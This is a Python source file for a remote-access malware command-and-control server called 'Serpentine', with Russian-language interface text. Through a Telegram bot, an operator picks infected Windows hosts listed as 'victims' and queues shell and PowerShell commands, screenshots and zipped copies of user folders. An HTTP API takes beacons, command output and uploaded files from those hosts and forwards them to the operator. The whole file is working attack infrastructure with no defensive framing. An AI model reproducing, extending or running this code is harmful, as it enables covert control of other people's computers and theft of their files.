import os, io, asyncio, logging, json, re
from pathlib import Path
from aiohttp import web
from aiogram import Bot, Dispatcher, F, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.client.default import DefaultBotProperties

BOT_TOKEN = os.environ.get("BOT_TOKEN", "PASTE_BOT_TOKEN")
ADMIN_ID  = int(os.environ.get("ADMIN_ID", "123456789"))
C2_HOST   = "0.0.0.0"
C2_PORT   = 8080

C2    = Path("./c2_data");   C2.mkdir(exist_ok=True)
QUEUE = C2/"queue";          QUEUE.mkdir(exist_ok=True)
INBOX = C2/"inbox";          INBOX.mkdir(exist_ok=True)
STATE_FILE = C2/"victims.json"

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=None))
dp  = Dispatcher()

STATE: dict = {}   # host -> {"admin": bool, "user": str}

def load_state():
    if STATE_FILE.exists():
        try: STATE.update(json.loads(STATE_FILE.read_text("utf-8")))
        except Exception: pass

def save_state():
    STATE_FILE.write_text(json.dumps(STATE, ensure_ascii=False, indent=2), "utf-8")

def push_cmd(host: str, cmd: str):
    q = QUEUE/host; q.mkdir(exist_ok=True)
    (q/f"{int(asyncio.get_event_loop().time()*1000)}.cmd").write_text(cmd, "utf-8")

def pop_all_cmds(host: str):
    q = QUEUE/host
    if not q.exists(): return []
    out = []
    for f in sorted(q.iterdir(), key=lambda p: p.stat().st_mtime):
        out.append(f.read_text("utf-8").strip())
        f.unlink()
    return out

def kb_main():
    rows = []
    for host, meta in STATE.items():
        emoji = "🛡" if meta.get("admin") else "👤"
        rows.append([InlineKeyboardButton(
            text=f"{emoji} {meta.get('user','?')}@{host}",
            callback_data=f"v:{host}")])
    rows.append([InlineKeyboardButton(text="🔄 Обновить", callback_data="refresh")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def kb_victim(host: str):
    m = STATE.get(host, {})
    if m.get("admin"):
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🛡 CMD (admin)", callback_data=f"cmda:{host}"),
             InlineKeyboardButton(text="🛡 PS (admin)",  callback_data=f"psa:{host}")],
            [InlineKeyboardButton(text="🖥 CMD (user)",  callback_data=f"cmd:{host}"),
             InlineKeyboardButton(text="⚡ PS (user)",   callback_data=f"ps:{host}")],
            [InlineKeyboardButton(text="📸 Скриншот",    callback_data=f"shot:{host}")],
            [InlineKeyboardButton(text="📂 Users.zip",   callback_data=f"zip:{host}")],
            [InlineKeyboardButton(text="🗂 Юзеры",       callback_data=f"users:{host}")],
            [InlineKeyboardButton(text="⬅️ Назад",       callback_data="back")],
        ])
    else:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🖥 CMD (user)",  callback_data=f"cmd:{host}"),
             InlineKeyboardButton(text="⚡ PS (user)",   callback_data=f"ps:{host}")],
            [InlineKeyboardButton(text="📸 Скриншот",    callback_data=f"shot:{host}")],
            [InlineKeyboardButton(text="📂 Мой Users.zip", callback_data=f"zip:{host}")],
            [InlineKeyboardButton(text="🗂 Юзеры",       callback_data=f"users:{host}")],
            [InlineKeyboardButton(text="⬅️ Назад",       callback_data="back")],
        ])

class St(StatesGroup):
    cmd_text = State()

# ---------- Telegram handlers ----------
@dp.message(Command("start"))
async def start(m: types.Message):
    if m.from_user.id != ADMIN_ID: return
    load_state()
    await m.answer("🐍 Serpentine\nактивных: " + str(len(STATE)), reply_markup=kb_main())

@dp.callback_query(F.data == "refresh")
async def refresh(cb: types.CallbackQuery):
    load_state()
    await cb.message.edit_text("🐍 Serpentine\nактивных: " + str(len(STATE)),
                               reply_markup=kb_main())

@dp.callback_query(F.data == "back")
async def back(cb: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await cb.message.edit_text("🐍 Serpentine", reply_markup=kb_main())

@dp.callback_query(F.data.startswith("v:"))
async def pick_victim(cb: types.CallbackQuery):
    host = cb.data.split(":",1)[1]
    m = STATE.get(host, {})
    role = "🛡 ADMIN" if m.get("admin") else "👤 USER"
    txt = (f"👤 {m.get('user','?')}@{host}\n"
           f"права: {role}\n"
           f"доступ: C:\\Users\\{m.get('user','?')}")
    await cb.message.edit_text(txt, reply_markup=kb_victim(host))

@dp.callback_query(F.data.startswith(("cmda:","psa:","shot:","zip:","users:")))
async def do_noarg(cb: types.CallbackQuery):
    kind, host = cb.data.split(":",1)
    push_cmd(host, f"__{kind}__")
    await cb.answer("отправлено")

@dp.callback_query(F.data.startswith(("cmd:","ps:")))
async def do_arg(cb: types.CallbackQuery, state: FSMContext):
    kind, host = cb.data.split(":",1)
    await state.update_data(victim=host, kind=kind)
    await state.set_state(St.cmd_text)
    await cb.message.edit_text(f"{kind} → {host}\nпришли команду одним сообщением")

@dp.message(St.cmd_text)
async def exec_cmd(m: types.Message, state: FSMContext):
    if m.from_user.id != ADMIN_ID: return
    d = await state.get_data()
    push_cmd(d["victim"], f"__{d['kind']}__ {m.text}")
    await m.answer("✅ отправлено")
    await state.clear()

# ---------- C2 HTTP API ----------
routes = web.RouteTableDef()

@routes.post("/beacon")
async def beacon(request: web.Request):
    data = await request.json()
    host  = data.get("host","unknown")
    user  = data.get("user","?")
    admin = bool(data.get("admin"))
    STATE[host] = {"user": user, "admin": admin}
    save_state()
    if request.app.get("first_seen", {}).get(host) is not True:
        request.app["first_seen"][host] = True
        try:
            await bot.send_message(ADMIN_ID,
                f"🟢 target online\n👤 user: {user}\n🖥 host: {host}\n"
                f"🛡 rights: {'ADMIN' if admin else 'USER'}\n"
                f"📂 access: {'all C:\\Users' if admin else 'C:\\Users\\'+user}")
        except Exception as e: logging.warning(f"tg notify: {e}")
    cmds = pop_all_cmds(host)
    return web.json_response({"cmds": cmds})

@routes.post("/result")
async def result(request: web.Request):
    data = await request.json()
    host  = data.get("host","unknown")
    name  = data.get("name","out.txt")
    text  = data.get("text","")
    try:
        await bot.send_message(ADMIN_ID, f"📥 {host} / {name}\n```\n{text[:3500]}\n```",
                               parse_mode="Markdown")
    except Exception:
        await bot.send_message(ADMIN_ID, f"📥 {host} / {name} (текст без markdown)")
    return web.json_response({"ok": True})

@routes.post("/file")
async def file_upload(request: web.Request):
    reader = await request.multipart()
    host = name = None
    blob = b""
    while True:
        part = await reader.next()
        if part is None: break
        if part.name == "host":  host = (await part.text()).strip()
        elif part.name == "name": name = (await part.text()).strip()
        elif part.name == "file": blob = await part.read(decode=False)
    if host and name:
        (INBOX/host).mkdir(parents=True, exist_ok=True)
        (INBOX/host/name).write_bytes(blob)
        try:
            await bot.send_document(ADMIN_ID, types.FSInputFile(INBOX/host/name))
        except Exception as e:
            logging.warning(f"tg file: {e}")
    return web.json_response({"ok": True})

async def run_http():
    app = web.Application(client_max_size=2*1024*1024*1024)
    app["first_seen"] = {}
    app.add_routes(routes)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, C2_HOST, C2_PORT)
    await site.start()
    logging.info(f"C2 listening on {C2_HOST}:{C2_PORT}")

async def main():
    logging.basicConfig(level=logging.INFO)
    load_state()
    await run_http()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())